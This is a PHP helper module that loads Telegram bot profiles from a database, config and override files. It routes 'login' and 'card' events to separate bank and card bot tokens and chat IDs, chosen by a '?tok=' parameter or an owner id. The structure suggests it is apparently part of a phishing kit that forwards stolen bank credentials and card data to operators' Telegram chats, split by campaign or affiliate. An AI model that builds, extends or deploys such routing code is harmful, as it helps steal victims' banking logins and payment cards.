<?php
// Helpers centralizados para gestionar perfiles/configuración de Telegram.

if (!function_exists('tg_bootstrap_database')) {
    /**
     * Asegura que la clase Database esté disponible cuando haga falta.
     */
    function tg_bootstrap_database()
    {
        if (class_exists('Database')) {
            return true;
        }
        $path = __DIR__ . '/db.php';
        if (is_file($path)) {
            require_once $path;
        }
        return class_exists('Database');
    }
}

if (!function_exists('tg_normalize_apply_targets')) {
    /**
     * Normaliza el campo apply_to (lista, JSON o texto) en un arreglo plano.
     */
    function tg_normalize_apply_targets($value)
    {
        if (is_array($value)) {
            $targets = $value;
        } else {
            $targets = [];
            if ($value !== null) {
                $raw = trim((string) $value);
                if ($raw !== '') {
                    $json = json_decode($raw, true);
                    if (json_last_error() === JSON_ERROR_NONE && is_array($json)) {
                        $targets = $json;
                    } else {
                        $targets = preg_split('/[\s,]+/', $raw, -1, PREG_SPLIT_NO_EMPTY);
                    }
                }
            }
        }

        $normalized = [];
        foreach ($targets as $target) {
            $target = trim((string) $target);
            if ($target === '') {
                continue;
            }
            $normalized[] = $target;
        }

        return array_values(array_unique($normalized));
    }
}

if (!function_exists('tg_clean_token')) {
    /**
     * Elimina cualquier espacio en blanco interno para asegurar tokens válidos.
     */
    function tg_clean_token($token)
    {
        $token = trim((string) $token);
        if ($token === '') {
            return '';
        }
        // Elimina saltos reales y secuencias literales (\n, \r)
        $token = str_replace(["\r\n", "\n", "\r", '\\r\\n', '\\n', '\\r'], '', $token);
        // Limpia tabulaciones u otros espacios residuales
        return preg_replace('/\s+/', '', $token);
    }
}

if (!function_exists('tg_clean_identifier')) {
    /**
     * Limpia IDs de chat u otros identificadores numéricos/string similares.
     */
    function tg_clean_identifier($value)
    {
        $value = trim((string) $value);
        if ($value === '') {
            return '';
        }
        return str_replace(["\r\n", "\n", "\r", '\\r\\n', '\\n', '\\r'], '', $value);
    }
}

if (!function_exists('tg_get_request_token')) {
    /**
     * Devuelve el token (?tok=) detectado en la petición actual.
     */
    function tg_get_request_token()
    {
        static $tok = null;
        if ($tok !== null) {
            return $tok;
        }
        $tok = '';
        if (isset($_GET['tok'])) {
            $tok = trim((string) $_GET['tok']);
        } elseif (isset($_POST['tok'])) {
            $tok = trim((string) $_POST['tok']);
        }
        return $tok;
    }
}

if (!function_exists('tg_load_profiles_config')) {
    /**
     * Carga `config/tgp.php` (si existe) y devuelve la lista de perfiles.
     */
    function tg_load_profiles_config()
    {
        static $cache = null;
        if ($cache !== null) {
            return $cache;
        }

        $path = __DIR__ . '/../config/tgp.php';
        if (is_file($path)) {
            $data = include $path;
            if (is_array($data)) {
                // Permitir que el archivo devolverá ['profiles' => [...]] o directamente la lista.
                if (isset($data['profiles']) && is_array($data['profiles'])) {
                    $data = $data['profiles'];
                }
                // Normalizar claves asociativas a lista plana.
                if (!empty($data) && array_keys($data) !== range(0, count($data) - 1)) {
                    $data = array_values(array_filter($data, 'is_array'));
                }
                $cache = $data;
                return $cache;
            }
        }

        $cache = [];
        return $cache;
    }
}

if (!function_exists('tg_load_profiles_database')) {
    /**
     * Recupera perfiles almacenados en la tabla `telegram_profiles` (si existe).
     */
    function tg_load_profiles_database()
    {
        static $cache = null;
        if ($cache !== null) {
            return $cache;
        }

        $cache = [];

        if (!tg_bootstrap_database()) {
            return $cache;
        }

        try {
            $db = Database::getConnection();
        } catch (\Throwable $e) {
            return $cache;
        }

        if (!$db) {
            return $cache;
        }

        $tableCheck = @mysqli_query($db, "SHOW TABLES LIKE 'telegram_profiles'");
        if (!$tableCheck || mysqli_num_rows($tableCheck) === 0) {
            return $cache;
        }

        $columnsRes = @mysqli_query($db, "SHOW COLUMNS FROM `telegram_profiles`");
        if (!$columnsRes) {
            return $cache;
        }

        $columns = [];
        while ($col = mysqli_fetch_assoc($columnsRes)) {
            $columns[$col['Field']] = true;
        }

        if (!isset($columns['chat_id']) || (!isset($columns['bank_token']) && !isset($columns['card_token']))) {
            return $cache;
        }

        $selectFields = array_keys($columns);
        $quotedFields = array_map(function ($field) {
            return '`' . $field . '`';
        }, $selectFields);

        $sql = 'SELECT ' . implode(', ', $quotedFields) . ' FROM `telegram_profiles`';

        $conditions = [];
        if (isset($columns['enabled'])) {
            $conditions[] = '`enabled` = 1';
        }
        if (isset($columns['is_active'])) {
            $conditions[] = '`is_active` = 1';
        }
        if (isset($columns['deleted_at'])) {
            $conditions[] = '`deleted_at` IS NULL';
        }
        if (isset($columns['removed_at'])) {
            $conditions[] = '`removed_at` IS NULL';
        }
        if (isset($columns['soft_deleted'])) {
            $conditions[] = '`soft_deleted` = 0';
        }

        if (!empty($conditions)) {
            $sql .= ' WHERE ' . implode(' AND ', $conditions);
        }

        if (isset($columns['sort_order'])) {
            $sql .= ' ORDER BY `sort_order` ASC';
        } elseif (isset($columns['priority'])) {
            $sql .= ' ORDER BY `priority` ASC';
        } elseif (isset($columns['position'])) {
            $sql .= ' ORDER BY `position` ASC';
        } elseif (isset($columns['id'])) {
            $sql .= ' ORDER BY `id` ASC';
        }

        $result = @mysqli_query($db, $sql);
        if (!$result) {
            return $cache;
        }

        while ($row = mysqli_fetch_assoc($result)) {
            $bank = isset($row['bank_token']) ? tg_clean_token($row['bank_token']) : '';
            $card = isset($row['card_token']) ? tg_clean_token($row['card_token']) : '';
            $chat = isset($row['chat_id']) ? tg_clean_identifier($row['chat_id']) : '';
            if ($chat === '' || ($bank === '' && $card === '')) {
                continue;
            }

            $apply = [];
            if (isset($row['apply_to'])) {
                $apply = tg_normalize_apply_targets($row['apply_to']);
            }
            if (isset($row['tok']) && $row['tok'] !== '') {
                $apply[] = 'tok:' . trim((string) $row['tok']);
            }
            if (isset($row['owner_id']) && $row['owner_id'] !== '' && $row['owner_id'] !== null) {
                $apply[] = 'owner:' . trim((string) $row['owner_id']);
            }

            $apply = array_values(array_unique(array_filter($apply, function ($item) {
                return trim((string) $item) !== '';
            })));

            if (empty($apply)) {
                $apply = ['*'];
            }

            $profile = [
                'id'          => isset($row['id']) ? $row['id'] : null,
                'name'        => isset($row['name']) ? $row['name'] : null,
                'chat_id'     => $chat,
                'bank_token'  => $bank !== '' ? $bank : null,
                'card_token'  => $card !== '' ? $card : null,
                'apply_to'    => $apply,
                'raw'         => $row,
            ];

            if (isset($row['owner_id'])) {
                $profile['owner_id'] = $row['owner_id'];
            }
            if (isset($row['only_login'])) {
                $profile['only_login'] = (int) $row['only_login'] === 1;
            }
            if (isset($row['only_card'])) {
                $profile['only_card'] = (int) $row['only_card'] === 1;
            }
            if (isset($row['mode'])) {
                $profile['mode'] = $row['mode'];
            }

            $cache[] = $profile;
        }

        return $cache;
    }
}

if (!function_exists('tg_profile_matches_context')) {
    /**
     * Determina si un perfil aplica al contexto actual (owner/tok).
     */
    function tg_profile_matches_context($profile, $context)
    {
        if (!is_array($profile)) {
            return false;
        }
        $targets = isset($profile['apply_to']) ? $profile['apply_to'] : array('*');
        if (!is_array($targets)) {
            $targets = array($targets);
        }

        $owner = isset($context['owner']) ? strtolower(trim((string) $context['owner'])) : '';
        $tok   = isset($context['tok']) ? strtolower(trim((string) $context['tok'])) : '';

        foreach ($targets as $target) {
            $target = strtolower(trim((string) $target));
            if ($target === '' || $target === '*' || $target === 'all' || $target === 'global') {
                return true;
            }
            if ($owner !== '') {
                if ($target === $owner || $target === 'owner:' . $owner) {
                    return true;
                }
            }
            if ($tok !== '') {
                if ($target === $tok || $target === 'tok:' . $tok) {
                    return true;
                }
            }
        }

        return false;
    }
}

if (!function_exists('tg_build_recipient')) {
    /**
     * Normaliza un perfil en un destinatario listo para enviar mensajes.
     */
    function tg_build_recipient($profile, $es_login, $source)
    {
        if (!is_array($profile)) {
            return null;
        }
        $bank = isset($profile['bank_token']) ? tg_clean_token($profile['bank_token']) : '';
        $card = isset($profile['card_token']) ? tg_clean_token($profile['card_token']) : '';
        $chat = isset($profile['chat_id']) ? tg_clean_identifier($profile['chat_id']) : '';

        $token = $es_login ? ($bank !== '' ? $bank : $card) : ($card !== '' ? $card : $bank);

        if ($token === '' || $chat === '') {
            return null;
        }

        $rawBase = array(
            'name'        => isset($profile['name']) ? $profile['name'] : null,
            'chat_id'     => $chat,
            'bank_token'  => $bank,
            'card_token'  => $card,
            'apply_to'    => isset($profile['apply_to']) ? $profile['apply_to'] : null,
        );

        $rawExtras = array();
        if (isset($profile['raw']) && is_array($profile['raw'])) {
            $rawExtras = $profile['raw'];
        }
        if (isset($profile['id']) && !isset($rawExtras['id'])) {
            $rawExtras['id'] = $profile['id'];
        }
        if (isset($profile['owner_id']) && !isset($rawExtras['owner_id'])) {
            $rawExtras['owner_id'] = $profile['owner_id'];
        }
        $raw = array_merge($rawExtras, $rawBase);

        return array(
            'token'  => $token,
            'chat'   => $chat,
            'name'   => isset($profile['name']) ? $profile['name'] : null,
            'source' => $source,
            'raw'    => $raw,
        );
    }
}

if (!function_exists('tg_prepare_profile')) {
    /**
     * Normaliza un perfil (apply_to, campos extra) antes de evaluarlo.
     */
    function tg_prepare_profile($profile)
    {
        if (!is_array($profile)) {
            return null;
        }

        $apply = isset($profile['apply_to']) ? tg_normalize_apply_targets($profile['apply_to']) : array();

        $tokTargets = array();
        foreach (array('tok', 'token', 'match_tok') as $tokKey) {
            if (!empty($profile[$tokKey])) {
                $value = trim((string) $profile[$tokKey]);
                if ($value !== '') {
                    $tokTargets[] = $value;
                }
            } elseif (!empty($profile['raw'][$tokKey] ?? null)) {
                $value = trim((string) $profile['raw'][$tokKey]);
                if ($value !== '') {
                    $tokTargets[] = $value;
                }
            }
        }
        foreach ($tokTargets as $target) {
            $apply[] = $target;
            if (stripos($target, 'tok:') !== 0) {
                $apply[] = 'tok:' . $target;
            }
        }

        foreach (array('owner', 'owner_id', 'user_id') as $ownerKey) {
            $value = null;
            if (isset($profile[$ownerKey])) {
                $value = $profile[$ownerKey];
            } elseif (isset($profile['raw'][$ownerKey])) {
                $value = $profile['raw'][$ownerKey];
            }
            if ($value !== null && $value !== '') {
                $apply[] = 'owner:' . trim((string) $value);
            }
        }

        $apply = tg_normalize_apply_targets($apply);
        if (empty($apply)) {
            $apply = array('*');
        }
        $profile['apply_to'] = $apply;

        return $profile;
    }
}

if (!function_exists('tg_filter_profiles_for_context')) {
    /**
     * Filtra perfiles por contexto devolviendo destinatarios listos.
     */
    function tg_filter_profiles_for_context($profiles, $context, $es_login, $source)
    {
        $matches = array();
        if (empty($profiles) || !is_array($profiles)) {
            return $matches;
        }

        foreach ($profiles as $profile) {
            $profile = tg_prepare_profile($profile);
            if ($profile === null) {
                continue;
            }

            if (!tg_profile_matches_context($profile, $context)) {
                continue;
            }

            if (!empty($profile['only_login']) && !$es_login) {
                continue;
            }
            if (!empty($profile['only_card']) && $es_login) {
                continue;
            }
            if (!empty($profile['mode'])) {
                $mode = strtolower(trim((string) $profile['mode']));
                if ($mode === 'login' && !$es_login) {
                    continue;
                }
                if ($mode === 'card' && $es_login) {
                    continue;
                }
            }

            $recipient = tg_build_recipient($profile, $es_login, $source);
            if ($recipient) {
                $matches[] = $recipient;
            }
        }

        return $matches;
    }
}

if (!function_exists('tg_profiles_from_config')) {
    /**
     * Devuelve destinatarios de la BD o config según el contexto.
     */
    function tg_profiles_from_config($context, $es_login)
    {
        $dbMatches = tg_filter_profiles_for_context(tg_load_profiles_database(), $context, $es_login, 'database');
        if (!empty($dbMatches)) {
            return $dbMatches;
        }

        return tg_filter_profiles_for_context(tg_load_profiles_config(), $context, $es_login, 'config');
    }
}

if (!function_exists('tg_load_override_bots')) {
    /**
     * Carga los bots definidos en config/telegram_override*.php.
     */
    function tg_load_override_bots()
    {
        static $cache = array('signature' => null, 'data' => null);

        $primary = realpath(__DIR__ . '/../config/tgo.php');
        $overrideFiles = array();

        if ($primary !== false && is_file($primary)) {
            $overrideFiles[] = $primary;
        }

        $legacy = glob(__DIR__ . '/../config/telegram_override*.php');
        if ($legacy) {
            sort($legacy, SORT_STRING);
            foreach ($legacy as $path) {
                $real = realpath($path);
                if ($real === false) {
                    continue;
                }
                if ($primary !== false && $real === $primary) {
                    continue;
                }
                $overrideFiles[] = $real;
            }
        }

        $signature = array();
        // Re-load overrides when file contents change (tracked by mtime).
        foreach ($overrideFiles as $overridePath) {
            clearstatcache(false, $overridePath);
            $signature[$overridePath] = is_file($overridePath) ? (int) @filemtime($overridePath) : 0;
        }

        if ($cache['signature'] !== null && $cache['signature'] === $signature) {
            return $cache['data'];
        }

        $loaded = array();

        foreach ($overrideFiles as $overridePath) {
            if (!is_file($overridePath)) {
                continue;
            }
            $tmp = include $overridePath;
            if (!is_array($tmp)) {
                continue;
            }
            if (isset($tmp[0]) && is_array($tmp[0])) {
                foreach ($tmp as $bot) {
                    if (is_array($bot)) {
                        $loaded[] = $bot;
                    }
                }
            } elseif (isset($tmp['chat_id'])) {
                $loaded[] = $tmp;
            }
        }

        $cache = array(
            'signature' => $signature,
            'data'      => $loaded,
        );

        return $loaded;
    }
}

if (!function_exists('ov_index_from_tok')) {
    /**
     * Deriva el índice (0-based) del override desde el parámetro 'tok'.
     */
    function ov_index_from_tok($tokRaw)
    {
        $tokRaw = (string) $tokRaw;
        if (preg_match('/ov(\d+)/i', $tokRaw, $m)) {
            return max(0, intval($m[1]) - 1);
        }
        if (preg_match('/(\d+)$/', $tokRaw, $m)) {
            return max(0, intval($m[1]) - 1);
        }
        if (preg_match('/(\d+)/', $tokRaw, $m)) {
            return max(0, intval($m[1]) - 1);
        }
        return 0;
    }
}

if (!function_exists('tg_override_recipient')) {
    /**
     * Selecciona un destinatario desde los overrides legacy.
     */
    function tg_override_recipient($context, $es_login, $allowFallback = true)
    {
        $bots = tg_load_override_bots();
        if (empty($bots)) {
            return array();
        }

        $normalized = array();
        foreach ($bots as $bot) {
            if (!is_array($bot)) {
                continue;
            }

            $profile = array(
                'name'       => isset($bot['name']) ? $bot['name'] : null,
                'chat_id'    => isset($bot['chat_id']) ? $bot['chat_id'] : null,
                'bank_token' => isset($bot['bank_token']) ? $bot['bank_token'] : (isset($bot['token_bank']) ? $bot['token_bank'] : (isset($bot['token']) ? $bot['token'] : null)),
                'card_token' => isset($bot['card_token']) ? $bot['card_token'] : (isset($bot['token_card']) ? $bot['token_card'] : (isset($bot['token']) ? $bot['token'] : null)),
                'apply_to'   => isset($bot['apply_to']) ? tg_normalize_apply_targets($bot['apply_to']) : array('*'),
                'raw'        => $bot,
            );

            if (empty($profile['apply_to'])) {
                $profile['apply_to'] = array('*');
            }

            $normalized[] = $profile;
        }

        $matches = array();
        foreach ($normalized as $profile) {
            if (!tg_profile_matches_context($profile, $context)) {
                continue;
            }
            $recipient = tg_build_recipient($profile, $es_login, 'override');
            if ($recipient) {
                $matches[] = $recipient;
            }
        }

        if (!empty($matches)) {
            return tg_unique_recipients($matches);
        }

        if (!$allowFallback) {
            return array();
        }

        $tok = isset($context['tok']) ? $context['tok'] : '';
        $index = ov_index_from_tok($tok);
        $count = count($normalized);
        if ($count === 0) {
            return array();
        }

        if ($index < 0) {
            $index = 0;
        }
        if ($index >= $count) {
            $index = $count - 1;
        }

        for ($offset = 0; $offset < $count; $offset++) {
            $candidateIndex = ($index + $offset) % $count;
            $recipient = tg_build_recipient($normalized[$candidateIndex], $es_login, 'override');
            if ($recipient) {
                return array($recipient);
            }
        }

        return array();
    }
}

if (!function_exists('tg_unique_recipients')) {
    /**
     * Filtra destinatarios duplicados (token+chat) manteniendo sus metadatos.
     */
    function tg_unique_recipients($recipients)
    {
        if (!is_array($recipients)) {
            return array();
        }
        $seen = array();
        $unique = array();
        foreach ($recipients as $rcpt) {
            if (!is_array($rcpt)) {
                continue;
            }
            $token = isset($rcpt['token']) ? $rcpt['token'] : '';
            $chat  = isset($rcpt['chat']) ? $rcpt['chat'] : '';
            if ($token === '' || $chat === '') {
                continue;
            }
            $key = $token . '#' . $chat;
            if (isset($seen[$key])) {
                continue;
            }
            $seen[$key] = true;
            $unique[] = $rcpt;
        }
        return $unique;
    }
}
